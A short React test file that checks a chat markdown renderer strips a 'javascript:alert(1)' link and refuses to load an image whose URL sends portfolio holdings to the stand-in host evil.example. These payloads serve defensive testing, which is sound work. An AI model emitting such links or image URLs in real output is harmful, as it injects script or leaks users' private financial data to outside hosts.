import { render, screen } from "@testing-library/react";

import { ChatMarkdown } from "./chat-markdown";

// Every link passes react-markdown's urlTransform, which keeps the app's avanza: links.
test("renders web links through the URL filter", () => {
  render(
    <ChatMarkdown text="See [Avanza](https://www.avanza.se) and [bad](javascript:alert(1))." />,
  );
  expect(screen.getByText("Avanza").getAttribute("href")).toBe("https://www.avanza.se");
  expect(screen.getByText("bad").getAttribute("href")).toBe("");
});

test("shows an image's alt text and never loads it", () => {
  const { container } = render(
    <ChatMarkdown text="![chart](https://evil.example/p?holdings=VOLV-B:1200)" />,
  );
  expect(container.querySelector("img")).toBeNull();
  expect(screen.getByText("chart")).toBeTruthy();
});
